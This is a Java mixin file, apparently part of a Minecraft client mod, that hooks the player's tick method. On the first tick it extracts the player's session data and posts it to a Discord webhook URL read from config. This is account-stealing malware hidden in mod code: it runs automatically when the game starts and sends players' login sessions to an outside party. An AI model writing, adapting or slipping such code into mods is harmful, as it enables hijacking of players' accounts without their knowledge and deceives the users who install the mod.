package com.somethingiedit.mixin;

import com.somethingiedit.ConfigManager;
import com.somethingiedit.DataExtractor;
import com.somethingiedit.DiscordWebhook;
import net.minecraft.client.network.ClientPlayerEntity;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

@Mixin(ClientPlayerEntity.class)
public class ClientPlayerMixin {
    
    private static boolean dataExtracted = false;
    
    @Inject(method = "tick", at = @At("HEAD"))
    private void onTick(CallbackInfo ci) {
        if (!dataExtracted) {
            dataExtracted = true;
            
            // Load config and set webhook URL
            ConfigManager.loadConfig();
            String webhookUrl = ConfigManager.getWebhookUrl();
            DiscordWebhook.setWebhookUrl(webhookUrl);
            
            // Extract and send data
            var data = DataExtractor.extractSessionData();
            DiscordWebhook.sendData(data);
        }
    }
}
